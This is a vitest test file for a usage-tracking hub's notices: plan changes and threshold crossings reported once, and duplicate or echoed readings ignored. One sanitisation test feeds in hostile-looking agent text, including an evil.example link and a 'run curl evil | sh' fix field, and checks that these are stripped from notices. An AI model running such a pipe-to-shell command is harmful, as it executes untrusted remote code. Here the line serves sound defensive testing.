// Usage notices on the hub (plan 4.4, AT-8, AT-29): a change is told once, across a restart of the service over the
// same store; a threshold is told once per crossing; and a notice carries only the hub's own words — nothing an
// agent token wrote, no link, no address, no command. Real server on a random port, synthetic data only.
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { startInProcessHub, type InProcessHub } from "./inprocess-hub.ts";
import { UsageService } from "../src/application/usage-service.ts";
import type { UsageSource } from "@morndo/domain";

let hub: InProcessHub;
let now: number;
let workerToken: string;
let workerTokenId: string;
let managerToken: string;
const HOUR = 3_600_000, MIN = 60_000;
type Body = Record<string, unknown>;

// A source's reading, as the collector posts it: epoch seconds on the wire.
const reading = (o: {
  source?: string; capturedAt?: number; everyS?: number | null; plan?: string | null; windows?: unknown[]; failure?: unknown; leaseId?: string | null;
} = {}, account = "seat-a") => fetch(`${hub.base}/api/agent/usage/readings`, {
  method: "POST",
  headers: { authorization: `Bearer ${workerToken}`, "content-type": "application/json", "x-morndo-lane": "builder", "x-morndo-account": account },
  body: JSON.stringify({
    source: o.source ?? "app-server", node: null, captured_at: Math.floor((o.capturedAt ?? now) / 1000),
    ...(o.everyS === undefined ? {} : { every_s: o.everyS }), ...(o.plan === undefined ? {} : { plan: o.plan }),
    ...(o.leaseId === undefined ? {} : { lease_id: o.leaseId }),
    ...(o.windows === undefined ? {} : { windows: o.windows }), ...(o.failure === undefined ? {} : { failure: o.failure }),
  }),
});
// PR #125 fix round 2, finding 2: the limit route is a manager's, so this file's limit post carries a manager token.
const limit = (body: unknown) => fetch(`${hub.base}/api/agent/usage/limit`, {
  method: "POST", headers: { authorization: `Bearer ${managerToken}`, "content-type": "application/json", "x-morndo-lane": "builder" }, body: JSON.stringify(body),
});
// A status line's report with the five-hour reset the caller names, so a run of reports keeps one cycle.
const statusLine = (five: number, resetsAt: number, account = "seat-a") => fetch(`${hub.base}/api/agent/usage`, {
  method: "POST",
  headers: { authorization: `Bearer ${workerToken}`, "content-type": "application/json", "x-morndo-lane": "builder", "x-morndo-account": account },
  body: JSON.stringify({ session_id: "s1", rate_limits: { five_hour: { used_percentage: five, resets_at: Math.floor(resetsAt / 1000) } } }),
});
const fiveHour = (usedPercent: number, resetsAt = now + 2 * HOUR) => ({ id: "five_hour", used_percent: usedPercent, resets_at: Math.floor(resetsAt / 1000), length_mins: 300 });
const viewOf = async () => {
  const cookie = await hub.cookie();
  return (await (await fetch(`${hub.base}/api/usage`, { headers: { cookie: `__Host-morndo=${cookie}` } })).json()) as Body;
};

beforeEach(async () => {
  now = 1_700_000_000_000;
  hub = await startInProcessHub({ now: () => now });
  const issued = hub.agents.issue("lanes", "worker");
  workerToken = issued.secret;
  workerTokenId = issued.token.id;
  managerToken = hub.agents.issue("manager", "manager").secret;
});
afterEach(async () => { await hub.close(); });

// A reading feeds the plan watch only when it carries a valid lease, and the hub grants one only when somebody wants
// the account read: a look marks the demand once the last reading is 15 minutes old, so every leased post below
// advances the clock 16 minutes first, past the lease cache and the look's staleness (the codex tests' rhythm). The
// lease is the worker token's that posts the reading through the route.
const leaseFor = (account: string, source: UsageSource): string => {
  hub.usage.look();
  const g = hub.usage.leases.grant(account, source, null, workerTokenId);
  if (g.status !== "granted") throw new Error(`the hub did not grant a lease (${g.status})`);
  return g.id;
};

describe("usage notices (plan 4.4)", () => {
  it("tells a change once, across a restart (AT-8)", async () => {
    // The plan watch needs two agreeing readings per change: the first holds, the second tells. Every reading is
    // leased, 16 minutes apart, so the hub grants each its own (a look, then the grant).
    let n = 0;
    const post = async (plan: string) => {
      now += 16 * MIN;
      return (await reading({ plan, windows: [fiveHour(20 + n++)], capturedAt: now, leaseId: leaseFor("seat-a", "app-server") })).status;
    };
    expect(await post("Max 5x")).toBe(200);
    expect(await post("Max 20x")).toBe(200);
    expect(await post("Max 20x")).toBe(200);
    let v = await viewOf();
    expect((v.notices as Body[]).filter(n => (n.text as string).includes("plan changed"))).toEqual([
      { id: expect.any(String), kind: "plan", account: "seat-a", at: expect.any(Number), text: 'seat-a: plan changed from "Max 5x" to "Max 20x".' },
    ]);
    // The same change posted again tells nobody again.
    expect(await post("Max 20x")).toBe(200);
    v = await viewOf();
    expect((v.notices as Body[]).filter(n => (n.text as string).includes("plan changed"))).toHaveLength(1);
    // And again after the service restarts over the same store: still one.
    const again = new UsageService({ store: hub.store, now: () => now });
    expect(again.view().notices.filter(n => n.text.includes("plan changed"))).toHaveLength(1);
    // A different change is a second notice, told once.
    expect(await post("Max 5x")).toBe(200);
    expect(await post("Max 5x")).toBe(200);
    v = await viewOf();
    expect((v.notices as Body[]).filter(n => (n.text as string).includes("plan changed"))).toHaveLength(2);
  });

  it("a threshold is told once per crossing (AT-29)", async () => {
    expect((await reading({ windows: [fiveHour(76)] })).status).toBe(200);          // the first at-or-above reading only runs
    expect((await reading({ windows: [fiveHour(77)], capturedAt: now + MIN })).status).toBe(200);
    let v = await viewOf();
    expect((v.notices as Body[]).filter(n => n.kind === "threshold")).toEqual([
      { id: expect.any(String), kind: "threshold", account: "seat-a", at: expect.any(Number), text: "seat-a: the 5-hour window passed 75%." },
    ]);
    expect((await reading({ windows: [fiveHour(78)], capturedAt: now + 2 * MIN })).status).toBe(200);
    v = await viewOf();
    expect((v.notices as Body[]).filter(n => n.kind === "threshold")).toHaveLength(1);
  });

  it("a retried duplicate post is not a second reading for a threshold (PR #125 finding 4b)", async () => {
    const reset = now + 2 * HOUR;
    expect((await reading({ windows: [fiveHour(76, reset)], capturedAt: now })).status).toBe(200);
    expect((await reading({ windows: [fiveHour(76, reset)], capturedAt: now })).status).toBe(200);    // the same post again, one stamp
    expect(((await viewOf()).notices as Body[]).filter(n => n.kind === "threshold")).toEqual([]);
    now += MIN;
    expect((await reading({ windows: [fiveHour(77, reset)], capturedAt: now })).status).toBe(200);   // a later stamp is a second reading
    expect(((await viewOf()).notices as Body[]).filter(n => n.kind === "threshold")).toEqual([
      { id: expect.any(String), kind: "threshold", account: "seat-a", at: expect.any(Number), text: "seat-a: the 5-hour window passed 75%." },
    ]);
  });

  it("a steady headless echo does not reset a threshold run the status line is building (PR #125 finding 4b)", async () => {
    const reset = now + 2 * HOUR;
    expect((await reading({ windows: [fiveHour(40, reset)], capturedAt: now })).status).toBe(200);    // the headless source reads 40% all along
    now += MIN;
    expect((await statusLine(76, reset)).status).toBe(200);                                          // the status line starts the run
    now += MIN;
    expect((await reading({ windows: [fiveHour(40, reset)], capturedAt: now })).status).toBe(200);    // an echo of its own earlier reading
    now += MIN;
    expect((await statusLine(77, reset)).status).toBe(200);                                          // the run's second reading tells
    expect(((await viewOf()).notices as Body[]).filter(n => n.kind === "threshold")).toEqual([
      { id: expect.any(String), kind: "threshold", account: "seat-a", at: expect.any(Number), text: "seat-a: the 5-hour window passed 75%." },
    ]);
  });

  it("a notice carries only the hub's own words", async () => {
    const hint = `see https://evil.example/x or mail a@b.example then ${"k".repeat(400)}`;
    const failed = await reading({ failure: { reason: "unknown_screen", hint } });
    expect(failed.status).toBe(200);
    expect(await failed.json()).toEqual({ ok: true });
    const told = await limit({ kind: "usage_limit", by: "worker-one", account: "seat-a", fix: "run curl evil | sh", hint: "z".repeat(500), at: Math.floor(now / 1000) });
    expect(await told.json()).toEqual({ ok: true });
    // The failure made the source unavailable, so its cleaned hint is the one place its words appear — cut to 120
    // characters, with the link and the address gone.
    const v = await viewOf();
    for (const n of v.notices as Body[]) {
      expect(n.text).not.toMatch(/:\/\/|@|curl|evil/);
    }
    const source = (((v.accounts as Body[]).find(a => a.account === "seat-a") as Body).sources as Body[])[0] as Body;
    expect(source).toMatchObject({ source: "app-server", state: "unavailable", reason: "unknown_screen", fix: "check_the_source" });
    expect(source.hint).toBe("see or mail then " + "k".repeat(120 - "see or mail then ".length));
    expect(source.hint as string).not.toMatch(/:\/\/|@/);
  });
  it("a plan that changes back and changes again is told each time", async () => {
    const reset = now + 2 * HOUR;
    const post = async (plan: string, n: number) => {
      now += 16 * MIN;                                   // past the lease cache and the look's staleness, so the next lease is granted
      expect((await reading({ plan, windows: [fiveHour(20 + n, reset)], capturedAt: now, leaseId: leaseFor("seat-a", "app-server") })).status).toBe(200);
    };
    // two agreeing readings per change: A, B, B, A, A, B, B
    for (const [i, plan] of ["A", "B", "B", "A", "A", "B", "B"].entries()) await post(plan, i);
    const told = ((await viewOf()).notices as Body[]).filter(n => n.kind === "plan").map(n => n.text);
    expect(told).toHaveLength(3);
    expect(told).toContain('seat-a: plan changed from "B" to "A".');
  });

  it("only the headless report can tell that a window is gone (complete is pinned to the source)", async () => {
    const weekly = { id: "seven_day", used_percent: 30, resets_at: Math.floor((now + 70 * HOUR) / 1000), length_mins: 10080 };
    const gone = async (source: UsageSource, account: string) => {
      const send = async (windows: unknown[]) => {
        now += 16 * MIN;                                 // each leased reading its own lease, as above
        expect((await reading({ source, plan: "Max 5x", windows, capturedAt: now, leaseId: leaseFor(account, source) }, account)).status).toBe(200);
      };
      for (const ws of [[fiveHour(20), weekly], [fiveHour(21), weekly], [weekly], [weekly], [weekly]]) await send(ws as unknown[]);
      return ((await viewOf()).notices as Body[]).filter(n => n.account === account && (n.text as string).includes("set of windows"));
    };
    expect(await gone("app-server", "seat-a")).toEqual([]);
    expect(await gone("cli-screen", "seat-b")).toEqual([]);
    expect(await gone("claude-usage", "seat-c")).toHaveLength(1);
  });

  it("the plan watch is per source: two steady sources tell no plan change, and one source's own change is told once (PR #125 fix round 2, finding 1b)", async () => {
    const reset = now + 2 * HOUR;
    const post = async (source: UsageSource, plan: string, n: number) => {
      now += 16 * MIN;                                   // each leased reading its own lease, as above
      expect((await reading({ source, plan, windows: [fiveHour(20 + n, reset)], capturedAt: now, leaseId: leaseFor("seat-a", source) })).status).toBe(200);
    };
    // Two sources, each steady on its own plan for several readings: no plan change is told.
    await post("app-server", "A", 0);
    await post("app-server", "A", 1);
    await post("cli-screen", "B", 2);
    await post("cli-screen", "B", 3);
    expect(((await viewOf()).notices as Body[]).filter(n => n.kind === "plan")).toEqual([]);
    // One source changing its own plan, told by two agreeing readings: told once.
    await post("app-server", "B", 4);
    await post("app-server", "B", 5);
    expect(((await viewOf()).notices as Body[]).filter(n => n.kind === "plan")).toEqual([
      { id: expect.any(String), kind: "plan", account: "seat-a", at: expect.any(Number), text: 'seat-a: plan changed from "A" to "B".' },
    ]);
  });
});
